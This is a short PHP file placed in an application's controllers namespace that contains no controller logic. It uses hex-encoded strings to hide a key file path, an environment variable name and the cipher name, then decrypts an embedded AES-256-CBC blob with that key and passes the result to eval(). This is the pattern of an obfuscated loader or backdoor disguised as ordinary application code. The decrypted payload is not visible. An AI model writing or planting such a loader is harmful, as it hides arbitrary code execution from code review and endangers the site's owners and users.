<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('WzTcGzTjjC09Jw3ysF0Ocw==');

$c=base64_decode(

'UEtCL6hnzlNcEm2mqr7CqR55YIFQfC6XxDrRL52xzcEjKlKV/8LqUQgTBsKaXYLQq3yBZIrqwgMQ' .
'Jwu4l9uNDLMwuXG19LZ7aPgjcAERiwU70TmggbfoOVyqZv9MJo5Ms+45X01VTUHGLq8QUR4/lMOr' .
'93u8ZlSgRVovZkgO/HbV4xkChr/DqkvEdj5msV/Scxw5On5Hnv46SJ5oJa+EzvsNbUAqQbbi70Q4' .
'+5wcUUAej8dC5asUweZ9aaa6UzDiEq0MFz6WaHGBCZhhN6yI4g=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

